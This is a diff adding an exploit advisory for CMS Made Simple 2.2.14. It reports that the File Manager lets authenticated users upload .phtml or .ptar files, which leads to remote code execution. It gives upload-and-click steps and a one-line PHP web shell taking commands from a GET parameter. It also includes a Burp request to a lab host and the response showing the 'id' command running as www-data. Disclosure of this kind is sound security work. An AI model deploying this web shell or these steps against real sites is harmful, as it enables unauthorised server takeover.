@@ -1,0 +1,53 @@
+# Exploit Title: CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)
+# Google Dork: -
+# Date: 2020-07-29
+# Exploit Author: Roel van Beurden
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: http://s3.amazonaws.com/cmsms/downloads/14793/cmsms-2.2.14-install.zip
+# Version: 2.2.14
+# Tested on: Linux Ubuntu 18.04
+# CVE: N/A
+
+
+1. Description:
+----------------------
+CMS Made Simple 2.2.14 allows Authenticated Arbitrary File Upload because the File Manager does not block .ptar and .phtml files. A malicious user can perform remote code execution.
+
+
+2. Proof of Concept:
+----------------------
+- Create .phtml or .ptar file with malicious PHP payload;
+- Upload .phtml or .ptar file in the 'File Manager' module;
+- Click on the uploaded file to perform remote code execution.
+
+
+3: Example payload:
+----------------------
+<?php system($_GET['cmd']);?>
+
+
+4a: Burp request:
+----------------------
+GET /cmsms/uploads/rce.phtml?cmd=id HTTP/1.1
+Host: 10.10.10.12
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+
+Cookie: d2f3b04a992e92af78d4f451813df40fa6f4f4b4=2c462b984c95aa0a8d18f59e2dd21defb7d7e368%3A%3AeyJ1aWQiOjIsInVzZXJuYW1lIjoiUm9lbCIsImVmZl91aWQiOm51bGwsImVmZl91c2VybmFtZSI6bnVsbCwiaGFzaCI6IiQyeSQxMCQ4NS5qSy5nTTMxZmJEQmlGTXlIYlQuUUR5eFRDekpsSVFncjhOS1FMbDhBSUlIUjVYeVNJZSJ9; __c=e9ef732e78dc5a9f603; CMSSESSIDde72be53c754=71mvdcppeeunddtap69k26ia4v
+
+Upgrade-Insecure-Requests: 1
+
+
+4b: Burp response:
+----------------------
+HTTP/1.1 200 OK
+Date: Thu, 30 Jul 2020 23:14:47 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 54
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
